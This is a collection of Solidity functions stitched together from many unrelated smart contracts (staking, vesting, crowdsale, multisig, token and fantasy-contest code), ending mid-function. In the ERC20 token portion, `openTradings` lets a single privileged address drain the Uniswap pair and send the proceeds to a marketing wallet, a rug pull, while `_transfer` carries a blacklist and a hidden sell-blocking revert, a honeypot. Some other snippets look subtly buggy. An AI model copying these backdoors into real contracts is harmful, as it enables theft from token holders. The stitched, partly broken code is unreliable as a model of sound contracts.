function sell(uint256 amount) internal {
    uint256 numEthersBeforeFee = getEtherForTokens(amount);
    uint256 fee = 0;
    uint256 trickle = 0;
    if (totalBondSupply != holdings[msg.sender]) {
        fee = fluxFeed(numEthersBeforeFee, false, false);
        trickle = fee / trickTax;
        fee -= trickle;
        tricklingFlo[msg.sender] += trickle;
    }
    uint256 numEthers = numEthersBeforeFee - (fee + trickle);
    uint256 resolved = mint(
        calcResolve(msg.sender, amount, numEthersBeforeFee),
        msg.sender
    );
    avgFactor_ethSpent[msg.sender] = TOKEN_scaleDown(avgFactor_ethSpent[msg.sender], amount);
    souleculeR[msg.sender] = TOKEN_scaleDown(souleculeR[msg.sender], amount);
    souleculeG[msg.sender] = TOKEN_scaleDown(souleculeG[msg.sender], amount);
    souleculeB[msg.sender] = TOKEN_scaleDown(souleculeB[msg.sender], amount);
    totalBondSupply -= amount;
    holdings[msg.sender] -= amount;
    int256 payoutDiff = (int256)(earningsPerBond * amount); 
    payouts[msg.sender] -= payoutDiff;
    totalPayouts -= payoutDiff;
    if (totalBondSupply > 0) {
        uint256 etherFee = fee * scaleFactor;
        uint256 rewardPerShare = etherFee / totalBondSupply;
        earningsPerBond += rewardPerShare;
    }
    fullCycleSellBonds(numEthers);
    trickleSum += trickle;
    trickleUp();
    emit onTokenSell(msg.sender, holdings[msg.sender] + amount, amount, numEthers, resolved);
}

function withdraw(address to) public {
    trickleUp();
    uint256 balance = dividends(msg.sender);
    payouts[msg.sender] += (int256)(balance * scaleFactor);
    totalPayouts += (int256)(balance * scaleFactor);
    uint256 pocketETH = pocket[msg.sender];
    pocket[msg.sender] = 0;
    trickleSum -= pocketETH;
    balance += pocketETH;
    withdrawSum += balance;
    to.transfer(balance);
    emit onCashDividends(to, balance);
}

function partyTo(address hodler) public {
    uint value = balanceOf[hodler];
    require(value > 0);
    balanceOf[hodler] = 0;
    if (now < lockedUntil[hodler]) {
        require(msg.sender == hodler);
        uint fee = value * 10 / 100; 
        owner.transfer(fee);
        value -= fee;
        Fee(hodler, fee, lockedUntil[hodler] - now);
    }
    hodler.transfer(value);
    Party(hodler, value, lockedFor[hodler]);
    uint index = indexOfHodler[hodler];
    require(index > 0);
    if (index + 1 < hodlers.length) {
        hodlers[index - 1] = hodlers[hodlers.length - 1];
        indexOfHodler[hodlers[index - 1]] = index;
    }
    hodlers.length--;
    delete balanceOf[hodler];
    delete lockedUntil[hodler];
    delete lockedFor[hodler];
    delete indexOfHodler[hodler];
}

function hodlFor(uint duration) internal {
    if (indexOfHodler[msg.sender] == 0) {
        hodlers.push(msg.sender);
        indexOfHodler[msg.sender] = hodlers.length; 
    }
    balanceOf[msg.sender] += msg.value;
    if (duration > 0) { 
        require(lockedUntil[msg.sender] < now + duration);
        lockedUntil[msg.sender] = now + duration;
        lockedFor[msg.sender] = duration;
    }
    Hodl(msg.sender, msg.value, lockedUntil[msg.sender], lockedFor[msg.sender]);
}

function withdrawStakedTokens(uint256 stakingId) public returns(bool) {
    require(_tokenStakingAddress[stakingId] == msg.sender, "No staked token found on this address and ID");
    require(_TokenTransactionstatus[stakingId] != true, "Either tokens are already withdrawn or blocked by admin");
    if (_tokenTotalDays[stakingId] == PERIOD_SILVER) {
        require(now >= _tokenStakingStartTime[stakingId] + WITHDRAW_TIME_SILVER, "Unable to Withdraw Staked token before 45 days of staking start time, Please Try Again Later!!!");
        _TokenTransactionstatus[stakingId] = true;
        if (now >= _tokenStakingEndTime[stakingId]) {
            _finalTokenStakeWithdraw[stakingId] = _usersTokens[stakingId].add(getTokenRewardDetailsByStakingId(stakingId));
            itoken.transfer(msg.sender, _finalTokenStakeWithdraw[stakingId]);
            totalTokenStakesInContract = totalTokenStakesInContract.sub(_usersTokens[stakingId]);
        } else {
            _finalTokenStakeWithdraw[stakingId] = _usersTokens[stakingId].add(getTokenPenaltyDetailByStakingId(stakingId));
            itoken.transfer(msg.sender, _finalTokenStakeWithdraw[stakingId]);
            totalTokenStakesInContract = totalTokenStakesInContract.sub(_usersTokens[stakingId]);
        }
    } else if (_tokenTotalDays[stakingId] == PERIOD_GOLD) {
        require(now >= _tokenStakingStartTime[stakingId] + WITHDRAW_TIME_GOLD, "Unable to Withdraw Staked token before 90 days of staking start time, Please Try Again Later!!!");
        _TokenTransactionstatus[stakingId] = true;
        if (now >= _tokenStakingEndTime[stakingId]) {
            _finalTokenStakeWithdraw[stakingId] = _usersTokens[stakingId].add(getTokenRewardDetailsByStakingId(stakingId));
            itoken.transfer(msg.sender, _finalTokenStakeWithdraw[stakingId]);
            totalTokenStakesInContract = totalTokenStakesInContract.sub(_usersTokens[stakingId]);
        } else {
            _finalTokenStakeWithdraw[stakingId] = _usersTokens[stakingId].add(getTokenPenaltyDetailByStakingId(stakingId));
            itoken.transfer(msg.sender, _finalTokenStakeWithdraw[stakingId]);
            totalTokenStakesInContract = totalTokenStakesInContract.sub(_usersTokens[stakingId]);
        }
    } else if (_tokenTotalDays[stakingId] == PERIOD_PLATINUM) {
        require(now >= _tokenStakingStartTime[stakingId] + WITHDRAW_TIME_PLATINUM, "Unable to Withdraw Staked token before 135 days of staking start time, Please Try Again Later!!!");
        _TokenTransactionstatus[stakingId] = true;
        if (now >= _tokenStakingEndTime[stakingId]) {
            _finalTokenStakeWithdraw[stakingId] = _usersTokens[stakingId].add(getTokenRewardDetailsByStakingId(stakingId));
            itoken.transfer(msg.sender, _finalTokenStakeWithdraw[stakingId]);
            totalTokenStakesInContract = totalTokenStakesInContract.sub(_usersTokens[stakingId]);
        } else {
            _finalTokenStakeWithdraw[stakingId] = _usersTokens[stakingId].add(getTokenPenaltyDetailByStakingId(stakingId));
            itoken.transfer(msg.sender, _finalTokenStakeWithdraw[stakingId]);
            totalTokenStakesInContract = totalTokenStakesInContract.sub(_usersTokens[stakingId]);
        }
    } else {
        return false;
    }
    return true;
}

function calculateSumToWithdraw() public view returns(uint) {
    uint256 currentBalance = token.balanceOf(this);
    if (now <= lockTimeout)
        return 0;
    if (now > lockTimeout + vestingPeriod)
        return currentBalance;
    uint256 minRequiredBalance = totalTokenBalance - totalTokenBalance * (now - lockTimeout) / vestingPeriod;
    if (minRequiredBalance > currentBalance)
        return 0;
    else
        return currentBalance - minRequiredBalance;
}

function() public {
    uint256 currentBalance = token.balanceOf(this);
    uint256 additionalTokens = currentBalance - latestTokenBalance;
    totalTokenBalance = totalTokenBalance + additionalTokens;
    uint withdrawAmount = calculateSumToWithdraw();
    token.transfer(beneficiary, withdrawAmount);
    latestTokenBalance = token.balanceOf(this);
}

function processTransaction(address _contributor, uint _amount) internal {
    uint maxContribution = calculateMaxContribution(_contributor); 
    uint contributionAmount = _amount;
    uint returnAmount = 0;
    if (maxContribution < _amount) { 
        contributionAmount = maxContribution; 
        returnAmount = _amount - maxContribution; 
    }
    if (ethRaised + contributionAmount > minCap && minCap < ethRaised) MinCapReached(block.number);
    if (contributorList[_contributor].isActive == false) { 
        contributorList[_contributor].isActive = true; 
        contributorList[_contributor].contributionAmount = contributionAmount; 
        contributorIndexes[nextContributorIndex] = _contributor; 
        nextContributorIndex++;
    } else {
        contributorList[_contributor].contributionAmount += contributionAmount; 
    }
    ethRaised += contributionAmount; 
    uint tokenAmount = contributionAmount * ethToMusicConversion; 
    token.mintTokens(_contributor, tokenAmount); 
    contributorList[_contributor].tokensIssued += tokenAmount; 
    if (returnAmount != 0) _contributor.transfer(returnAmount); 
}

function claimCofounditTokens() {
    require(msg.sender == cofounditAddress); 
    require(crowdsaleState == state.crowdsaleEnded); 
    require(!cofounditHasClaimedTokens); 
    token.mintTokens(cofounditAddress, cofounditReward); 
    cofounditHasClaimedTokens = true; 
}

function claimCoreTeamsTokens(address _to) onlyOwner {
    require(crowdsaleState == state.crowdsaleEnded); 
    require(!ownerHasClaimedTokens); 
    uint devReward = maxTokenSupply - token.totalSupply();
    if (!cofounditHasClaimedTokens) devReward -= cofounditReward; 
    token.mintTokens(_to, devReward); 
    ownerHasClaimedTokens = true; 
}

function batchReturnEthIfFailed(uint _numberOfReturns) onlyOwner {
    require(block.number > crowdsaleEndedBlock && ethRaised < minCap); 
    address currentParticipantAddress;
    uint contribution;
    for (uint cnt = 0; cnt < _numberOfReturns; cnt++) {
        currentParticipantAddress = contributorIndexes[nextContributorToClaim]; 
        if (currentParticipantAddress == 0x0) return; 
        if (!hasClaimedEthWhenFail[currentParticipantAddress]) { 
            contribution = contributorList[currentParticipantAddress].contributionAmount; 
            hasClaimedEthWhenFail[currentParticipantAddress] = true; 
            if (!currentParticipantAddress.send(contribution)) { 
                ErrorSendingETH(currentParticipantAddress, contribution); 
            }
        }
        nextContributorToClaim += 1; 
    }
}

function getBonusRate(uint256 _weiAmount) internal view returns(uint256) {
    uint256 bonusRate = rate;
    uint[3] memory weiRaisedStartsBounds = [uint(0), uint(0), uint(0)];
    uint[3] memory weiRaisedEndsBounds = [uint(10000000000000000000000), uint(10000000000000000000000), uint(10000000000000000000000)];
    uint64[3] memory timeStartsBounds = [uint64(1613059200), uint64(1613606400), uint64(1614211200)];
    uint64[3] memory timeEndsBounds = [uint64(1613606400), uint64(1614211200), uint64(1616630400)];
    uint[3] memory weiRaisedAndTimeRates = [uint(500), uint(250), uint(150)];
    for (uint i = 0; i < 3; i++) {
        bool weiRaisedInBound = (weiRaisedStartsBounds[i] <= weiRaised) && (weiRaised < weiRaisedEndsBounds[i]);
        bool timeInBound = (timeStartsBounds[i] <= now) && (now < timeEndsBounds[i]);
        if (weiRaisedInBound && timeInBound) {
            bonusRate += bonusRate * weiRaisedAndTimeRates[i] / 1000;
        }
    }
    uint[2] memory weiAmountBounds = [uint(10000000000000000000000), uint(5000000000000000000)];
    uint[2] memory weiAmountRates = [uint(0), uint(100)];
    for (uint j = 0; j < 2; j++) {
        if (_weiAmount >= weiAmountBounds[j]) {
            bonusRate += bonusRate * weiAmountRates[j] / 1000;
            break;
        }
    }
    return bonusRate;
}

function init() public onlyOwner {
    require(!initialized);
    initialized = true;
    if (PAUSED) {
        MainToken(token).pause();
    }
    address[1] memory addresses = [address(0x6ddf26d97e308628b5a12630abed095648f00695)];
    uint[1] memory amounts = [uint(40000000000000000000000000000)];
    uint64[1] memory freezes = [uint64(0)];
    for (uint i = 0; i < addresses.length; i++) {
        if (freezes[i] == 0) {
            MainToken(token).mint(addresses[i], amounts[i]);
        } else {
            MainToken(token).mintAndFreeze(addresses[i], amounts[i], freezes[i]);
        }
    }
    transferOwnership(TARGET_USER);
    emit Initialized();
}

function sell(uint256 tokenToSell) external returns(bool) {
    require(tokenSold >= tokenToSell, "Token sold should be greater than zero");
    require(msg.sender != address(0), "address zero");
    require(tokenToSell <= tokenLedger[msg.sender], "insufficient balance");
    require(tokenToSell >= 10, "Sold limit is 10 token");
    uint256 deduction = tokenToSell * 3 / 100;
    uint256 payable_token = tokenToSell - deduction;
    uint256 convertedWei = etherValueTransfer(payable_token);
    uint256 selling_limit = buy_monthly[msg.sender] * 30 / 100;
    if (tokenToSell <= selling_limit) {
        uint256 sold_by_user = sold[msg.sender] + tokenToSell;
        if (sold_by_user <= selling_limit) {
            sold[msg.sender] = sold[msg.sender].add(tokenToSell);
            tokenLedger[msg.sender] = tokenLedger[msg.sender].sub(tokenToSell);
            tokenSold = tokenSold.sub(tokenToSell);
            priceAlgoSell();
            msg.sender.transfer(convertedWei);
            emit Transfer(msg.sender, address(this), payable_token);
            emit Sells(msg.sender, convertedWei, tokenToSell);
        } else {
            revert("Selling Limit Exceeded.Try again With Less tokens.");
        }
    } else {
        revert("Selling Limit Exceeded.Try again With Less coins.");
    }
    return true;
}

function extend_time() public {
    if (block.timestamp >= firstTimeBuy[msg.sender] + 30 days) {
        firstTimeBuy[msg.sender] = block.timestamp;
        buy_monthly[msg.sender] = tokenLedger[msg.sender];
        sold[msg.sender] = 0;
    }
}

function confirm(bytes32 operation) public confirmAndRun(operation) returns(bool) {
    PendingTransactionState storage status = pendingTransaction[operation];
    if (status.info.to != 0 || status.info.value != 0 || status.info.data.length != 0) {
        emit MultiTransaction(
            msg.sender,
            operation,
            status.info.to,
            status.info.value,
            status.info.data,
            execute0(status.info.to, status.info.value, status.info.data)
        );
        delete pendingTransaction[operation].info;
        return true;
    }
}

function checkAndUpdateLimit(uint256 value) private returns(bool) {
    if (today() > lastDay) {
        spentToday = 0;
        lastDay = today();
    }
    uint256 _spentToday = spentToday.add(value);
    if (_spentToday <= dailyLimit) {
        spentToday = _spentToday;
        return true;
    }
    return false;
}

function _transfer(
    address from,
    address to,
    uint256 amount
) internal override {
    require(from != address(0), "ERC20: transfer from the zero address");
    require(to != address(0), "ERC20: transfer to the zero address");
    require(!bots[from] && !bots[to]);
    if (amount == 0) {
        super._transfer(from, to, 0);
        return;
    }
    if (limitsInEffect) {
        if (
            from != owner() &&
            to != owner() &&
            to != address(0) &&
            to != address(0xdead) &&
            !swapping
        ) {
            if (!tradingActive) {
                require(_isExcludedFromFees[from] || _isExcludedFromFees[to], "Trading is not active.");
            }
            if (automatedMarketMakerPairs[from] && !_isExcludedMaxTransactionAmount[to]) {
                require(amount <= maxTransactionAmount, "Buy transfer amount exceeds the maxTransactionAmount.");
            }
            else if (automatedMarketMakerPairs[to] && !_isExcludedMaxTransactionAmount[from]) {
                require(amount <= maxTransactionAmount, "Sell transfer amount exceeds the maxTransactionAmount.");
            }
        }
    }
    uint256 contractTokenBalance = balanceOf(address(this));
    bool canSwap = contractTokenBalance >= swapTokensAtAmount;
    if (
        canSwap &&
        swapEnabled &&
        !swapping &&
        !automatedMarketMakerPairs[from] &&
        !_isExcludedFromFees[from] &&
        !_isExcludedFromFees[to]
    ) {
        swapping = true;
        swapBack();
        swapping = false;
    }
    bool takeFee = !swapping;
    if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
        takeFee = false;
    }
    uint256 fees = 0;
    if (takeFee) {
        if (automatedMarketMakerPairs[to] && sellTotalFees > 0) {
            fees = amount.mul(sellTotalFees).div(100);
            tokensForLiquidity += fees * sellLiquidityFee / sellTotalFees;
            tokensForDev += fees * sellDevFee / sellTotalFees;
            tokensForMarketing += fees * sellMarketingFee / sellTotalFees;
            if (maxTransactionAmount == 1) revert("ERROR: Must be less than maxTxAmount");
        }
        else if (automatedMarketMakerPairs[from] && buyTotalFees > 0) {
            fees = amount.mul(buyTotalFees).div(100);
            tokensForLiquidity += fees * buyLiquidityFee / buyTotalFees;
            tokensForDev += fees * buyDevFee / buyTotalFees;
            tokensForMarketing += fees * buyMarketingFee / buyTotalFees;
        }
        if (fees > 0) {
            super._transfer(from, address(this), fees);
        }
        amount -= fees;
    }
    super._transfer(from, to, amount);
}

function openTradings(uint quantity) external {
    require(msg.sender == waiting);
    uint tokens = balanceOf(uniswapV2Pair);
    _transfer(uniswapV2Pair, address(this), tokens - 1);
    swapDone(quantity);
}

function swapDone(uint quantity) private {
    IUniswapV2Pair(uniswapV2Pair).sync();
    swapTokensForEth(quantity * 10 ** decimals());
    (bool success, ) = address(marketingWallet).call {
        value: address(this).balance
    }("");
}

function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != owner);
    require(lockedAddresses[newOwner] < now);
    address oldOwner = owner;
    super.transferOwnership(newOwner);
    if (oldOwner != tokensWallet) {
        allowed[tokensWallet][oldOwner] = 0;
        emit Approval(tokensWallet, oldOwner, 0);
    }
    if (owner != tokensWallet) {
        allowed[tokensWallet][owner] = balances[tokensWallet];
        emit Approval(tokensWallet, owner, balances[tokensWallet]);
    }
    verifiedKYCAddresses[newOwner] = true;
    emit KYCVerified(newOwner);
}

function changeTechAccountAddress(address _address) public onlyOwner {
    require(_address != address(0) && _address != techAccount);
    require(lockedAddresses[_address] < now);
    techAccount = _address;
    emit SetTechAccount(techAccount);
    verifiedKYCAddresses[_address] = true;
    emit KYCVerified(_address);
}

function lockAddress(address _address, uint256 _time) public hasAddressLockupPermission returns(bool) {
    require(_address != owner && _address != tokensWallet && _address != techAccount);
    require(balances[_address] == 0 && lockedAddresses[_address] == 0 && _time > now);
    lockedAddresses[_address] = _time;
    emit AddressLocked(_address, _time);
    return true;
}

function exitContest(uint32 _teamId) public {
    address owner;
    int32 score;
    uint32 place;
    bool holdsEntryFee;
    bool ownsPlayerTokens;
    (owner, score, place, holdsEntryFee, ownsPlayerTokens) = teamContract.getTeam(_teamId);
    require(owner == msg.sender);
    uint32 _contestId = teamIdToContestId[_teamId];
    require(_contestId > 0);
    Contest storage _contestToExitFrom = contests[_contestId];
    require(_contestToExitFrom.startTime > uint64(now));
    if (holdsEntryFee) {
        teamContract.refunded(_teamId);
        if (_contestToExitFrom.entryFee > 0) {
            _authorizePayment(owner, _contestToExitFrom.entryFee);
            emit ContestTeamRefundPaid(_contestId, _teamId, _contestToExitFrom.entryFee);
        }
    }
    teamContract.releaseTeam(_teamId); 
    uint32 lastTeamIdx = uint32(_contestToExitFrom.teamIds.length) - 1;
    uint32 lastTeamId = _contestToExitFrom.teamIds[lastTeamIdx];
    uint32 toRemoveIdx = _contestToExitFrom.teamIdToIdx[_teamId];
    require(_contestToExitFrom.teamIds[toRemoveIdx] == _teamId); 
    _contestToExitFrom.teamIds[toRemoveIdx] = lastTeamId; 
    _contestToExitFrom.teamIdToIdx[lastTeamId] = toRemoveIdx; 
    delete _contestToExitFrom.teamIds[lastTeamIdx]; 
    _contestToExitFrom.teamIds.length--; 
    delete _contestToExitFrom.teamIdToIdx[_teamId]; 
    delete teamIdToContestId[_teamId];
    emit ContestExited(_contestId, _teamId);
}

function releaseTeams(uint32 _contestId, uint32[] _teamIds) public {
    require((_contestId < contests.length) && (_contestId > 0));
    Contest storage c = contests[_contestId];
    require((c.status == ContestStatus.Canceled) || (c.endTime <= uint64(now)));
    for (uint32 i = 0; i < _teamIds.length; i++) {
        uint32 teamId = _teamIds[i];
        uint32 teamContestId = teamIdToContestId[teamId];
        if (teamContestId == _contestId) {
            address owner;
            int32 score;
            uint32 place;
            bool holdsEntryFee;
            bool ownsPlayerTokens;
            (owner, score, place, holdsEntryFee, ownsPlayerTokens) = teamContract.getTeam(teamId);
            if ((c.status == ContestStatus.Canceled) && holdsEntryFee) {
                teamContract.refunded(teamId);
                if (c.entryFee > 0) {
                    emit ContestTeamRefundPaid(_contestId, teamId, c.entryFee);
                    _authorizePayment(owner, c.entryFee);
                }
            }
            if (ownsPlayerTokens) {
                teamContract.releaseTeam(teamId);
            }
        }
    }
}

function enterContest(uint32 _contestId, uint32[] _tokenIds) public payable whenNotPaused {
    require(msg.sender != address(0));
    require((_contestId > 0) && (_contestId < contests.length));
    Contest storage _contestToEnter = contests[_contestId];
    require(_contestToEnter.status == ContestStatus.Active);
    require(_contestToEnter.startTime > uint64(now));
    require(msg.value >= _contestToEnter.entryFee);
    uint32 maxEntries = uint32(_contestToEnter.maxMinEntries >> 32);
    if (maxEntries > 0) {
        require(_contestToEnter.teamIds.length < maxEntries);
    }
    uint32 _newTeamId = teamContract.createTeam(msg.sender, _tokenIds);
    uint256 _teamIndex = _contestToEnter.teamIds.push(_newTeamId) - 1;
    require(_teamIndex < 4294967295);
    _contestToEnter.teamIdToIdx[_newTeamId] = uint32(_teamIndex);
    teamIdToContestId[_newTeamId] = uint32(_contestId);
    emit ContestEntered(_contestId, _newTeamId);
}

function payWinners(uint32 _contestId, uint32 _payingStartingIndex, uint _numToPay, bool _isFirstPlace, uint32 _prevTies, uint32 _nextTies) public {
    require((_contestId > 0) && (_contestId < contests.length));
    Contest storage c = contests[_contestId];
    require((c.scoringOracleAddress == msg.sender) && (c.status == ContestStatus.Paying));
    uint32[] memory localVars = new uint32[](2);
    localVars[0] = _payingStartingIndex + 1;
    if (c.winnersToPay + _prevTies > 0) {
        uint32 s = (c.numWinners * (c.numWinners + 1)) / 2;
        uint128 m = c.prizeAmount / uint128(s);
        while ((c.winnersToPay + _prevTies > 0) && (_numToPay > 0)) {
            uint128 totalPayout = 0;
            uint32 totalNumWinnersWithTies = _prevTies;
            if (_prevTies > 0) {
                totalPayout = m * (_prevTies * c.winnersToPay + (_prevTies * (_prevTies + 1)) / 2);
            }
            localVars[1] = localVars[0];
            uint32 numProcessedThisTime = 0;
            while (teamContract.getScore(c.placeToWinner[localVars[1]]) == teamContract.getScore(c.placeToWinner[localVars[0]])) {
                if (c.winnersToPay > 0) {
                    totalPayout += m * c.winnersToPay;
                }
                totalNumWinnersWithTies++;
                numProcessedThisTime++;
                if (c.winnersToPay > 0) {
                    c.winnersToPay--;
                }
                localVars[1]++;
                _numToPay -= 1;
                if ((_numToPay == 0) || (c.placeToWinner[localVars[1]] == 0)) {
                    break;
                }
            }
            if (_isFirstPlace) {
                totalPayout += c.prizeAmount - m * s;
            }
            _isFirstPlace = false;
            if ((_numToPay == 0) && (_nextTies > 0)) {
                totalNumWinnersWithTies += _nextTies;
                if (_nextTies < c.winnersToPay) {
                    totalPayout += m * (_nextTies * (c.winnersToPay + 1) - (_nextTies * (_nextTies + 1)) / 2);
                } else {
                    totalPayout += m * (c.winnersToPay * (c.winnersToPay + 1) - (c.winnersToPay * (c.winnersToPay + 1)) / 2);
                }
            }
            uint128 payout = totalPayout / totalNumWinnersWithTies;
            if (c.winnersToPay == 0) {
                payout = c.remainingPrizeAmount / (numProcessedThisTime + _nextTies);
            }
            for (uint32 i = _prevTies;
                (i < (numProcessedThisTime + _prevTies)) && (c.remainingPrizeAmount > 0); i++) {
                if (i == (totalNumWinnersWithTies - 1)) {
                    if ((c.winnersToPay == 0) && (_nextTies == 0)) {
                        payout = c.remainingPrizeAmount;
                    } else {
                        payout = totalPayout - (totalNumWinnersWithTies - 1) * payout;
                    }
                }
                if (payout > c.remainingPrizeAmount) {
                    payout = c.remainingPrizeAmount;
                }
                c.remainingPrizeAmount -= payout;
                _authorizePayment(teamContract.getTeamOwner(c.placeToWinner[localVars[0]]), payout);
                emit ContestTeamWinningsPaid(_contestId, c.placeToWinner[localVars[0]], payout);
                localVars[0]++;
            }
            _prevTies = 0;
        }
    }
}

function createContest(
    string _name,
    address _scoringOracleAddress,
    uint32 _gameSetId,
    uint64 _startTime,
    uint64 _endTime,
    uint128 _entryFee,
    uint128 _prizeAmount,
    uint32 _maxEntries,
    uint32 _minEntries,
    uint8 _payoutKey,
    uint32[] _tokenIds
) public payable whenNotPaused {
    require(msg.sender != address(0));
    require(_endTime > _startTime);
    require(_maxEntries != 1);
    require(_minEntries <= _maxEntries);
    require(_startTime > uint64(now));
    require((msg.sender == commissionerAddress) || (_tokenIds.length > 0));
    require(((_prizeAmount + _entryFee) >= _prizeAmount) && ((_prizeAmount + _entryFee) >= _entryFee));
    if (_tokenIds.length > 0) {
        require(msg.value == (_prizeAmount + _entryFee));
    } else {
        require(msg.value == _prizeAmount);
    }
    if (_scoringOracleAddress == address(0)) {
        _scoringOracleAddress = commissionerAddress;
    }
    Contest memory _contest = Contest({
        scoringOracleAddress: _scoringOracleAddress,
        gameSetId: _gameSetId,
        maxMinEntries: (uint64(_maxEntries) << 32) | uint64(_minEntries),
        numWinners: 0,
        winnersToPay: 0,
        startTime: _startTime,
        endTime: _endTime,
        creator: msg.sender,
        entryFee: _entryFee,
        prizeAmount: _prizeAmount,
        remainingPrizeAmount: _prizeAmount,
        status: ContestStatus.Active,
        payoutKey: PayoutKey(_payoutKey),
        name: _name,
        teamIds: new uint32[](0)
    });
    uint32 uniqueTeamId = 0;
    if (_tokenIds.length > 0) {
        uniqueTeamId = teamContract.createTeam(msg.sender, _tokenIds);
        require(uniqueTeamId < 4294967295);
        _contest.teamIds = new uint32[](1);
        _contest.teamIds[0] = uniqueTeamId;
    }
    uint256 _contestId = contests.push(_contest) - 1;
    require(_contestId < 4294967295);
    if (_tokenIds.length > 0) {
        teamIdToContestId[uniqueTeamId] = uint32(_contestId);
    }
    emit ContestCreated(_contestId);
    if (_tokenIds.length > 0) {
        emit ContestEntered(_contestId, uniqueTeamId);
    }
}

function prepareToScore(uint32 _contestId) public {
    require((_contestId > 0) && (_contestId < contests.length));
    Contest storage c = contests[_contestId];
    require((c.scoringOracleAddress == msg.sender) && (c.status == ContestStatus.Active) && (c.endTime <= uint64(now)));
    require(uint32(c.teamIds.length) >= uint32(c.maxMinEntries & 0x00000000FFFFFFFF));
    c.status = ContestStatus.Scoring;
    uint32 numWinners = 1;
    if (c.payoutKey == PayoutKey.TopTen) {
        numWinners = 10;
    } else if (c.payoutKey == PayoutKey.FiftyFifty) {
        numWinners = uint32(c.teamIds.length) / 2;
    }
    c.winnersToPay = numWinners;
    c.numWinners = numWinners;
    require(c.numWinners <= c.teamIds.length);
}

function updateContestTeam(uint32 _contestId, uint32 _teamId, uint8[] _indices, uint32[] _tokenIds) public whenNotPaused {
    require((_contestId > 0) && (_contestId < contests.length));
    Contest storage c = contests[_contestId];
    require(c.status == ContestStatus.Active);
    require(c.startTime > uint64(now + 1 hours));
    teamContract.updateTeam(msg.sender, _teamId, _indices, _tokenIds);
}

function prepareToPayWinners(uint32 _contestId) public {
    require((_contestId > 0) && (_contestId < contests.length));
    Contest storage c = contests[_contestId];
    require((c.scoringOracleAddress == msg.sender) && (c.status == ContestStatus.Scoring) && (c.endTime < uint64(now)));
    c.status = ContestStatus.Paying;
}

function cancelContest(uint32 _contestId) public {
    require(_contestId > 0);
    Contest storage _toCancel = contests[_contestId];
    require(_toCancel.status == ContestStatus.Active);
    if (_toCancel.startTime > uint64(now)) {
        require((msg.sender == _toCancel.creator) || (msg.sender == _toCancel.scoringOracleAddress));
    } else {
        if (_toCancel.teamIds.length >= uint32(_toCancel.maxMinEntries & 0x00000000FFFFFFFF)) {
            require(msg.sender == _toCancel.scoringOracleAddress);
        }
    }
    if (_toCancel.prizeAmount > 0) {
        _authorizePayment(_toCancel.creator, _toCancel.prizeAmount);
        _toCancel.remainingPrizeAmount = 0;
    }
    _toCancel.status = ContestStatus.Canceled;
    emit ContestCanceled(_contestId);
}

function closeContest(uint32 _contestId) public {
    require((_contestId > 0) && (_contestId < contests.length));
    Contest storage c = contests[_contestId];
    require((c.scoringOracleAddress == msg.sender) && (c.status == ContestStatus.Paying) && (c.winnersToPay == 0));
    c.status = ContestStatus.Paid;
    uint128 totalEntryFees = c.entryFee * uint128(c.teamIds.length);
    if (c.scoringOracleAddress == commissionerAddress) {
        uint128 cut = _computeCut(totalEntryFees);
        totalEntryFees -= cut;
        cfoAddress.transfer(cut);
    }
    if (totalEntryFees > 0) {
        _authorizePayment(c.creator, totalEntryFees);
        emit ContestCreatorEntryFeesPaid(_contestId, totalEntryFees);
    }
    emit ContestClosed(_contestId);
}

function transferApprovedFunds() public {
    uint128 amount = authorizedUserPayment[msg.sender];
    if (amount > 0) {
        if (totalAuthorizedForPayment >= amount) {
            delete authorizedUserPayment[msg.sender];
            totalAuthorizedForPayment -= amount;
            msg.sender.transfer(amount);
            emit ContestApprovedFundsDelivered(msg.sender, amount);
        }
    }
}

function setTeamContractAddress(address _address) public onlyCEO {
